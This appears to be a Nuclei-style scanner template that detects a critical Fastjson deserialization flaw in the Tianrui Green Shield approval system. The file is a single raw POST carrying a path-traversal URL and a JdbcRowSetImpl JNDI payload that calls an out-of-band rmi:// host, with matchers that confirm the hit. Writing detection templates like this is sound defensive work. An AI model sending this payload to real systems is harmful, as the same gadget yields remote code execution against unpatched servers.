id: poc-yaml-tipray-gsas-asign-fastjson-deserialization

info:
  name: Tianrui Green Shield Approval System Fastjson Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: deserialization,dnslog

variables:
  random: "{{rand_text_alphanumeric(6)}}"

http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/rest/ext/mail/add/asign HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "@type": "com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName": "rmi://{{interactsh-url}}/{{random}}",
          "autoCommit": true
        }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "set property error"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
